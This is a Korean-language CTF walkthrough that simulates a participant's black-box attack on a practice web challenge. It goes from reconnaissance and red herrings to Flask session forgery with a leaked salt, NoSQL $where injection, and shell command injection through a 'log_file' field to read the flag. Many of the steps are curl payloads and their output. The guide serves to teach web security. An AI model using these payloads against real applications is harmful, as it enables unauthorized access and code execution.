# CTF 문제 풀이 - 참가자 관점 Walkthrough

실제 참가자가 처음부터 끝까지 문제를 푸는 과정을 시뮬레이션합니다.

**가정**:
- 블랙박스 테스트 (소스코드 없음)
- 주어진 정보: URL만 제공 (예: http://ctf.challenge.com:5000)
- 도구: 브라우저, curl, Python, Burp Suite (선택)

---

## 🎯 주어진 정보

```
Challenge: Legacy Microservice Exploitation
URL: http://ctf.challenge.com:5000
Goal: Find the FLAG
Difficulty: DreamHack Level 7-8
Time Limit: 2 hours
```

---

## Stage 0: 초기 정찰 (0-10분)

### 참가자의 사고:
> "일단 브라우저로 들어가서 뭐가 있는지 보자."

### Action 1: 브라우저 접속

```bash
Firefox → http://ctf.challenge.com:5000
```

**결과**:
```
✓ 깔끔한 기업 대시보드가 나타남
✓ "Microservice Platform" 제목
✓ 서비스 3개: auth, api, legacy
✓ "Legacy" 서비스가 "Deprecated" 상태
✓ 네비게이션: Dashboard, Services, API
```

### 참가자의 사고:
> "음... 전형적인 기업 마이크로서비스 플랫폼이네. Legacy가 Deprecated라고? 취약점이 있을 가능성이 높다. 일단 페이지를 더 둘러보자."

### Action 2: Services 페이지 확인

```
클릭: Services 메뉴
```

**결과**:
```
Auth Service: POST /api/auth/guest (게스트 세션 생성)
API Gateway: GET /api/v2/services (서비스 발견)
Legacy Service: "Documentation Unavailable" ← 🤔
```

### 참가자의 사고:
> "Legacy 서비스의 문서가 없네? 하지만 서비스는 존재한다고 나와있어. HTML 소스를 확인해보자."

### Action 3: View Source (F12)

```
우클릭 → View Page Source
또는 F12 → Elements 탭
```

**결과 (index.html)**:
```html
<!-- Red Herring: Fake admin hint -->
<!-- Admin panel accessible at /admin/login -->
<!-- Temporary credentials for testing: admin / CompanyName2025 -->

<!-- Red Herring: Fake backup hint -->
<!-- Database backups available at /backup/db_backup_2024.sql -->
<!-- Emergency access: /debug?key=admin123 -->
```

**결과 (services.html)**:
```html
<!-- Hidden comment for enumeration -->
<!-- Legacy endpoints exist but are not publicly documented -->
<!-- API enumeration may reveal additional services -->

<!-- Red Herring: Fake admin access hint -->
<!-- DEPRECATED: Direct admin access at /admin/panel -->
<!-- Use /admin/login with company credentials instead -->
```

### 참가자의 사고:
> "오! HTML 주석에 여러 힌트가 있네:
> 1. /admin/login - 관리자 로그인 페이지
> 2. admin / CompanyName2025 - 크레덴셜?
> 3. /backup, /debug - 추가 엔드포인트
> 4. **'API enumeration may reveal additional services'** ← 중요!
>
> 일단 두 가지 경로가 보인다:
> - A) /admin/login 시도
> - B) API enumeration
>
> 먼저 admin 로그인을 시도해보고, 안되면 API를 탐색하자."

### Action 4: robots.txt 확인 (기본 정찰)

```bash
curl http://ctf.challenge.com:5000/robots.txt
```

**결과**:
```
User-agent: *

# Public API
Allow: /api/v2/

# Disallow administrative interfaces
Disallow: /admin
Disallow: /admin/login
Disallow: /api/admin/

# Deprecated endpoints
Disallow: /api/legacy/

# Development files (do not index)
Disallow: /debug
Disallow: /test
Disallow: /.env
Disallow: /backup/
```

### 참가자의 사고:
> "robots.txt에 엄청 많은 경로가 나오네!
> - /admin/login - 확인됨
> - /api/admin/ - 관리자 API가 있다!
> - /api/legacy/ - Legacy API 경로 발견!
> - /debug, /backup - 추가 경로
>
> 일단 /admin/login부터 시도해보자."

---

## 🎭 Red Herring 단계 (10-25분) - 시간 낭비

### Action 5: Admin 로그인 시도

```bash
# 브라우저
http://ctf.challenge.com:5000/admin/login
```

**결과**:
```
깔끔한 로그인 폼이 나타남:
- Username: [입력창]
- Password: [입력창]
- [Login] 버튼
```

**HTML 주석 확인**:
```html
<!-- DEPRECATED: Traditional login disabled in v2.0 -->
<!-- Migration to session-based authentication complete -->
<!-- See /api/auth/* endpoints for new authentication flow -->
<!-- Legacy credentials (admin/admin123) no longer valid -->
```

### 참가자의 사고:
> "로그인 폼이 있네. HTML 주석을 보니... 'Traditional login disabled'? 하지만 일단 시도해보자."

### Action 6: 로그인 시도 (Burp Suite)

```http
POST /admin/login HTTP/1.1
Host: ctf.challenge.com:5000
Content-Type: application/json

{"username": "admin", "password": "CompanyName2025"}
```

**결과**:
```json
HTTP/1.1 401 Unauthorized

{"error": "Invalid credentials"}
```

### 참가자의 사고:
> "실패했네. 다른 비밀번호를 시도해보자."

### Action 7: 여러 크레덴셜 시도 (5분 낭비)

```bash
admin / admin123 → 401
admin / admin → 401
admin / password → 401
root / root → 401
```

**모두 실패**

### 참가자의 사고:
> "계속 401이 나온다. 혹시 SQL Injection이 가능할까?"

### Action 8: SQL Injection 시도 (5분 낭비)

```json
{"username": "admin' OR '1'='1", "password": "anything"}
{"username": "admin'--", "password": ""}
```

**결과**: 여전히 401

### 참가자의 사고:
> "SQL Injection도 안 되네. HTML 주석을 다시 보니 'See /api/auth/* endpoints' 라고 되어있어. 로그인 폼은 미끼인 것 같다. robots.txt에서 본 다른 경로들을 시도해보자."

### Action 9: 다른 경로 시도 (5분 낭비)

```bash
curl http://ctf.challenge.com:5000/admin
# {"error": "Unauthorized", "message": "Please login at /admin/login"}

curl http://ctf.challenge.com:5000/debug
# {"error": "Debug mode disabled"}

curl http://ctf.challenge.com:5000/debug?key=admin123
# {"error": "Debug mode disabled"}

curl http://ctf.challenge.com:5000/backup/db_backup_2024.sql
# {"error": "Access denied"}
```

**모두 실패**

### 참가자의 사고:
> "이 경로들은 다 막혀있거나 미끼인 것 같다. HTML 주석에서 힌트를 다시 보니:
> - 'API enumeration may reveal additional services'
> - '/api/auth/* endpoints for new authentication'
>
> API를 제대로 탐색해야 할 것 같다. /api/v2/services부터 시작하자."

**💡 깨달음**: 15분을 Red Herring에 낭비했지만, 이제 진짜 경로를 찾을 차례!

---

## Stage 1: API Enumeration (25-35분)

### Action 10: 서비스 목록 조회

```bash
curl http://ctf.challenge.com:5000/api/v2/services | jq
```

**결과**:
```json
{
  "services": [
    {
      "name": "auth",
      "version": "2.1.0",
      "status": "active",
      "description": "Authentication service"
    },
    {
      "name": "api",
      "version": "2.0.5",
      "status": "active",
      "description": "Main API gateway"
    },
    {
      "name": "legacy",
      "version": "1.0.0",
      "status": "deprecated",
      "description": "Legacy endpoints - scheduled for removal"
    }
  ]
}
```

### 참가자의 사고:
> "OK! 3개의 서비스가 있고, 각각 이름이 있네.
>
> 서비스 목록만 주고 끝낼 리 없는데... 각 서비스의 상세 정보를 어떻게 얻을까?
>
> 일반적인 RESTful API 패턴을 생각해보면:
> - `/api/v2/services` - 전체 목록
> - `/api/v2/services/{id}` - 특정 서비스 상세
> - `/api/v2/services/{name}` - 이름으로 조회
>
> 'auth', 'database', 'legacy'라는 이름이 주어졌으니, 한 번 시도해보자.
>
> 그리고 API 설계 관점에서 서비스별 엔드포인트 목록을 제공하는 패턴도 흔하다:
> - `/api/v2/services/{name}/info`
> - `/api/v2/services/{name}/endpoints`
> - `/api/v2/services/{name}/methods`
>
> 일단 endpoints부터 시도해보자."

### Action 11: 각 서비스의 엔드포인트 조회 시도

```bash
# 먼저 단순하게 서비스 이름만 붙여보기
curl http://ctf.challenge.com:5000/api/v2/services/auth
```

**결과**:
```json
{"error": "Not Found"}
```

### 참가자의 사고:
> "404네. 그럼 다른 패턴을 시도해보자.
>
> API 문서나 스웨거 같은 게 있을까? /api/v2/services/auth/docs? 아니면 /endpoints?"

```bash
# endpoints 경로 시도
curl http://ctf.challenge.com:5000/api/v2/services/auth/endpoints | jq
```

**결과 (성공!)**:
```json
{
  "service": "auth",
  "endpoints": [
    {
      "path": "/api/auth/guest",
      "method": "POST",
      "description": "Guest session creation"
    }
  ]
}
```

```bash
# Legacy 서비스 (중요!)
curl http://ctf.challenge.com:5000/api/v2/services/legacy/endpoints | jq
```

**결과**:
```json
{
  "service": "legacy",
  "endpoints": [
    {
      "path": "/api/legacy/get_salt",
      "method": "GET",
      "description": "Legacy utility"
    },
    {
      "path": "/api/legacy/system_info",
      "method": "GET",
      "description": "System information"
    }
  ]
}
```

### 참가자의 사고:
> "와! Legacy 서비스의 숨겨진 엔드포인트를 찾았다!
> - /api/legacy/get_salt - 'salt'라는 게 뭐지? 암호화 관련?
> - /api/legacy/system_info - 시스템 정보
>
> 이 엔드포인트들이 취약점의 시작점일 것 같다. 확인해보자."

---

## Stage 2: Salt 발견 (35-40분)

### Action 12: Salt 엔드포인트 호출

```bash
curl http://ctf.challenge.com:5000/api/legacy/get_salt | jq
```

**결과**:
```json
{
  "salt": "insane2"
}
```

### 참가자의 사고:
> "Salt 값이 'insane2'라고 나오네. 이게 뭔데?
> - 웹 보안에서 salt는 보통 비밀번호 해싱에 사용
> - 혹은 세션 키 생성에 사용
>
> system_info를 확인해서 더 많은 정보를 얻어보자."

### Action 13: System Info 조회

```bash
curl http://ctf.challenge.com:5000/api/legacy/system_info | jq
```

**결과**:
```json
{
  "framework": "Flask",
  "session_backend": "SecureCookie",
  "crypto": {
    "library": "hashlib",
    "algorithm": "sha256"
  },
  "notes": "Legacy system using 32-char keys"
}
```

### 참가자의 사고:
> "엄청 중요한 정보다!
> - Framework: Flask
> - Session: SecureCookie (Flask의 기본 세션 방식)
> - Crypto: hashlib, sha256
> - Notes: 32-char keys
>
> 아하! 연결이 보인다:
> 1. Flask는 secret_key로 세션을 서명함
> 2. Salt ('insane2')를 sha256으로 해시
> 3. 32글자로 자르면 → secret_key!
> 4. secret_key를 알면 세션을 위조할 수 있다!
>
> 이게 공격 체인의 핵심이다. 확인해보자."

---

## Stage 3-4: 세션 위조 준비 (40-55분)

### Action 14: Secret Key 계산

```python
# calc_secret.py
import hashlib

salt = "insane2"
secret_key = hashlib.sha256(salt.encode()).hexdigest()[:32]
print(f"Secret Key: {secret_key}")
```

```bash
python3 calc_secret.py
```

**결과**:
```
Secret Key: d8c5e3f7a2b4e1c9f6d3a8b2e5c7f1a4
```

### 참가자의 사고:
> "Secret key를 얻었다! 이제 Flask 세션을 위조할 수 있다.
>
> 하지만 어떤 세션을 만들어야 할까? robots.txt에서 /api/admin/ 경로를 봤었는데, 아마 관리자 권한이 필요할 것 같다.
>
> 먼저 게스트 세션을 만들어서 세션 구조를 확인해보자.
>
> Flask 세션은 쿠키로 전달되니까, 쿠키를 파일로 저장해서 나중에 재사용할 수 있게 하자.
> curl의 `-c` 옵션을 사용하면 쿠키를 파일로 저장할 수 있다."

### Action 15: 게스트 세션 생성

```bash
# -c cookies.txt: 쿠키를 파일로 저장 (나중에 재사용)
# -v: 헤더 상세 정보 확인 (Set-Cookie 헤더 보기)
curl -X POST http://ctf.challenge.com:5000/api/auth/guest -c cookies.txt -v
```

**결과**:
```http
HTTP/1.1 200 OK
Set-Cookie: session=.eJyrVoovSC3KTcxLzStRsiopKk3VUSrKz0lVslJKL00tLlHSUSotTi2CcePBnFoADnQTGw.ZqK3HA.Xm8vZN2Pg_9rQ7Kh3vY8sL2Bw4c; Path=/

{
  "status": "guest session created",
  "role": "guest"
}
```

### 참가자의 사고:
> "게스트 세션을 얻었다. 이 세션 쿠키를 디코딩해서 구조를 확인해보자."

### Action 16: 세션 디코딩 (flask-unsign)

```bash
# flask-unsign 설치
pip3 install flask-unsign

# 세션 디코딩
flask-unsign --decode --cookie ".eJyrVoovSC3KTcxLzStRsiopKk3VUSrKz0lVslJKL00tLlHSUSotTi2CcePBnFoADnQTGw.ZqK3HA.Xm8vZN2Pg_9rQ7Kh3vY8sL2Bw4c"
```

**결과**:
```json
{
  "role": "guest",
  "user": "guest_user"
}
```

### 참가자의 사고:
> "세션 구조가 보인다:
> - role: 'guest'
> - user: 'guest_user'
>
> 이걸 'admin'으로 바꾸면 관리자 권한을 얻을 수 있을 것 같다!"

### Action 17: Admin 세션 위조

```bash
# Admin 세션 생성
flask-unsign --sign \
  --cookie "{'role': 'admin', 'user': 'hacker'}" \
  --secret "d8c5e3f7a2b4e1c9f6d3a8b2e5c7f1a4"
```

**결과**:
```
.eJyrVoovSC3KTcxLzStRsiopKk3VUSrKz0lVslIqyS9OVdJRKi1OLYJx48GcWgAOdBMb.ZqK4QA.YpN3fG8Hk_4sR2Ji7wZ1sM3Cx5d
```

### 참가자의 사고:
> "Admin 세션을 만들었다! 이제 이걸 사용해서 /api/admin/ 경로에 접근해보자."

---

## Stage 5: Admin API 탐색 (55-65분)

### Action 18: Admin 엔드포인트 찾기

```bash
# robots.txt에서 /api/admin/이 있다고 했음
# 일반적인 admin API 패턴 시도

curl -X GET http://ctf.challenge.com:5000/api/admin \
  -H "Cookie: session=.eJyrVoovSC3KTcxLzStRsiopKk3VUSrKz0lVslIqyS9OVdJRKi1OLYJx48GcWgAOdBMb.ZqK4QA.YpN3fG8Hk_4sR2Ji7wZ1sM3Cx5d"
```

**결과**: 404 Not Found

```bash
# 다른 패턴 시도
curl -X GET http://ctf.challenge.com:5000/api/admin/users \
  -H "Cookie: session=..."
```

**결과**: 404

### 참가자의 사고:
> "흠... admin API가 어디 있는지 모르겠네.
>
> 생각해보니 서비스 발견 API가 있었잖아? /api/v2/services/admin/endpoints를 시도해볼까?"

```bash
curl http://ctf.challenge.com:5000/api/v2/services/admin/endpoints
```

**결과**: 404 (admin 서비스는 등록되지 않음)

### 참가자의 사고:
> "막혔네... 다시 생각해보자.
>
> 일반적인 admin API 패턴:
> - /api/admin/users
> - /api/admin/db (데이터베이스 관련?)
> - /api/admin/config
> - /api/admin/backup
>
> 'db'를 시도해보자."

### Action 19: 디렉토리 브루트포스 (또는 추론)

```bash
curl -X POST http://ctf.challenge.com:5000/api/admin/db \
  -H "Cookie: session=..." \
  -H "Content-Type: application/json" \
  -d '{}'
```

**결과**: 404

```bash
curl -X POST http://ctf.challenge.com:5000/api/admin/db/migrate \
  -H "Cookie: session=..." \
  -H "Content-Type: application/json" \
  -d '{}'
```

**결과**:
```json
{
  "status": "migration complete",
  "count": 0
}
```

### 참가자의 사고:
> "오! /api/admin/db/migrate가 존재한다! 그리고 응답이 왔다!
> - status: migration complete
> - count: 0
>
> 데이터베이스 마이그레이션 도구인 것 같다. 어떤 파라미터를 받는지 실험해보자."

---

## Stage 6: NoSQL Injection 발견 (65-80분)

### Action 20: API 파라미터 탐색

```bash
# 일반적인 DB 쿼리 파라미터 시도
curl -X POST http://ctf.challenge.com:5000/api/admin/db/migrate \
  -H "Cookie: session=..." \
  -H "Content-Type: application/json" \
  -d '{"query": {}}'
```

**결과**: count: 0

```bash
# filter 파라미터 시도
curl -X POST http://ctf.challenge.com:5000/api/admin/db/migrate \
  -H "Cookie: session=..." \
  -H "Content-Type: application/json" \
  -d '{"filter": {}}'
```

**결과**:
```json
{
  "status": "migration complete",
  "count": 4
}
```

### 참가자의 사고:
> "오! filter 파라미터가 작동한다! 그리고 count가 4가 됐어.
> - filter: {} = 모든 문서 반환
> - count: 4 = 데이터베이스에 4개 문서
>
> 이건 MongoDB 같은 NoSQL 데이터베이스인 것 같다. NoSQL Injection을 시도해보자."

### Action 21: NoSQL Injection 시도

```bash
# $ne (not equal) 연산자
curl -X POST http://ctf.challenge.com:5000/api/admin/db/migrate \
  -H "Cookie: session=..." \
  -H "Content-Type: application/json" \
  -d '{"filter": {"username": {"$ne": "null"}}}'
```

**결과**: count: 4

```bash
# $where 연산자 (JavaScript 실행!)
curl -X POST http://ctf.challenge.com:5000/api/admin/db/migrate \
  -H "Cookie: session=..." \
  -H "Content-Type: application/json" \
  -d '{"filter": {"$where": "function() { return true; }"}}'
```

**결과**:
```json
{
  "status": "migration complete",
  "count": 4,
  "mode": "advanced"  ← 새로운 필드!
}
```

### 참가자의 사고:
> "와! $where 연산자가 작동한다! 그리고 'mode': 'advanced'라는 새로운 필드가 나타났어.
>
> 이건 분명히 다른 코드 경로를 트리거한 것 같다. $where는 MongoDB에서 JavaScript를 실행하는 위험한 연산자인데...
>
> 혹시 다른 파라미터도 있을까? 로그 파일 같은 거?"

### Action 22: 추가 파라미터 탐색

```bash
# log_file 파라미터 시도
curl -X POST http://ctf.challenge.com:5000/api/admin/db/migrate \
  -H "Cookie: session=..." \
  -H "Content-Type: application/json" \
  -d '{"filter": {"$where": "function() { return true; }"}, "log_file": "/tmp/test.log"}'
```

**결과** (BLIND_RCE=false인 경우):
```json
{
  "status": "migration complete",
  "count": 4,
  "mode": "advanced",
  "log_output": "Migration started\nProcessing 4 records\nMigration completed"
}
```

### 참가자의 사고:
> "log_output이 나타났다! 그리고 명령어 실행 결과처럼 보인다!
>
> 만약 log_file 파라미터가 shell 명령어에 직접 들어간다면...
> Command Injection이 가능할 것 같다!"

---

## Stage 7: Command Injection → RCE (80-95분)

### Action 23: Command Injection 테스트

```bash
# 세미콜론으로 명령어 체이닝
curl -X POST http://ctf.challenge.com:5000/api/admin/db/migrate \
  -H "Cookie: session=..." \
  -H "Content-Type: application/json" \
  -d '{"filter": {"$where": "function() { return true; }"}, "log_file": "/tmp/test.log; whoami"}'
```

**결과**:
```json
{
  "status": "migration complete",
  "count": 4,
  "mode": "advanced",
  "log_output": "Migration started\nProcessing 4 records\nMigration completed\nctfuser"
}
```

### 참가자의 사고:
> "성공! whoami 명령어가 실행됐고 'ctfuser'가 출력됐다!
>
> Command Injection이 확인됐다. 이제 FLAG를 찾아야 한다."

### Action 24: FLAG 찾기

```bash
# 환경 변수 확인
curl -X POST http://ctf.challenge.com:5000/api/admin/db/migrate \
  -H "Cookie: session=..." \
  -H "Content-Type: application/json" \
  -d '{"filter": {"$where": "function() { return true; }"}, "log_file": "/tmp/x; env"}'
```

**결과**:
```json
{
  "status": "migration complete",
  "count": 4,
  "mode": "advanced",
  "log_output": "...\nFLAG=FLAG{l3g4cy_s3rv1c3s_4r3_d4ng3r0us_wh3n_f0rg0tt3n}\n..."
}
```

### 🎉 FLAG 획득!

```
FLAG{l3g4cy_s3rv1c3s_4r3_d4ng3r0us_wh3n_f0rg0tt3n}
```

---

## 📊 풀이 시간 분석

| 단계 | 시간 | 누적 시간 |
|------|------|----------|
| Stage 0: 초기 정찰 | 10분 | 10분 |
| Red Herring (낭비) | 15분 | 25분 |
| Stage 1: API Enumeration | 10분 | 35분 |
| Stage 2: Salt 발견 | 5분 | 40분 |
| Stage 3-4: 세션 위조 | 15분 | 55분 |
| Stage 5: Admin API 탐색 | 10분 | 65분 |
| Stage 6: NoSQL Injection | 15분 | 80분 |
| Stage 7: RCE → FLAG | 15분 | **95분** |

**총 풀이 시간: 약 95분 (1시간 35분)**

---

## 🧠 참가자의 핵심 사고과정

### 1. 초기 정찰의 중요성
> "일단 모든 페이지를 둘러보고, HTML 소스도 확인하고, robots.txt도 체크한다."

### 2. Red Herring 식별
> "15분 동안 /admin/login을 시도했지만 계속 실패. HTML 주석에 'See /api/auth/*' 힌트를 다시 보고 방향 전환."

### 3. API 패턴 인식 (시행착오)
> "/api/v2/services가 있고 서비스 이름이 주어졌다.
> 먼저 /api/v2/services/auth를 시도 → 404
> 그럼 RESTful 패턴으로 /endpoints, /info, /methods 등을 시도해보자 → 성공!"

### 4. 정보 연결
> "Salt + sha256 + 32-char = Flask secret_key. 이건 세션 위조로 이어진다!"

### 5. 점진적 탐색
> "Admin API 경로를 모르니까, 일반적인 패턴을 시도한다: /users, /db, /config..."

### 6. 취약점 체이닝
> "NoSQL Injection ($where) → 다른 코드 경로 → log_file 파라미터 발견 → Command Injection"

### 7. 페이로드 정제
> "필터를 우회하려면 세미콜론을 사용. env 명령으로 환경변수에서 FLAG 발견!"

---

## 🎓 학습 포인트

### 참가자가 배우는 것:

1. **정찰 기술**
   - HTML 소스 분석
   - robots.txt 확인
   - API 패턴 인식

2. **Red Herring 식별**
   - 막힌 경로는 빠르게 포기
   - 힌트를 다시 읽고 방향 전환

3. **공격 체이닝**
   - 정보 노출 (Salt)
   - 세션 위조 (Flask)
   - NoSQL Injection (MongoDB)
   - Command Injection (RCE)

4. **Flask 보안**
   - secret_key의 중요성
   - SecureCookie의 동작 방식
   - 세션 위조 기법

5. **NoSQL 보안**
   - $where 연산자의 위험성
   - JavaScript 실행
   - 입력 검증의 중요성

6. **Command Injection**
   - Shell 명령어 체이닝
   - 필터 우회 (세미콜론)
   - 환경변수에서 FLAG 찾기

---

## 완료! 🎊

이 풀이 과정은 실제 DreamHack Level 7-8 난이도에 적합하며,
참가자가 다음 스킬을 모두 사용해야 합니다:

✅ 웹 정찰
✅ API 분석
✅ 암호화 이해 (sha256)
✅ Flask 세션 위조
✅ NoSQL Injection
✅ Command Injection
✅ 논리적 추론

**예상 풀이 시간: 60-100분**
**난이도: 적절**
